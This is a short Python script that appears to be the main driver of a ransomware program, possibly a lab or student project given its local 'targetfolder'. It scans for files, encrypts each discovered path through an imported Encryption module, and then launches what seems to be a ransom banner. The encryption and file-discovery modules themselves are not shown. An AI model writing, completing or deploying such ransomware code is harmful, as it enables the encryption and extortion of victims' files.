import os
import Encryption
import banner
import filediscovery

target_folder = "targetfolder"

def setup():
    os.makedirs(target_folder, exist_ok=True)

if __name__ == "__main__":
    setup()

    print("[+] Scanning files...")

    # store paths in a variable
    discovered_paths = filediscovery.scan_files()

    print(f"[+] Found {len(discovered_paths)} files")

    print("[+] Encrypting files...")
    for path in discovered_paths:
        print(f"Encrypting: {path['path']}")
        Encryption.encrypt_folder(path['path'])
   

    print("[+] Launching banner...")
    banner.run_banner()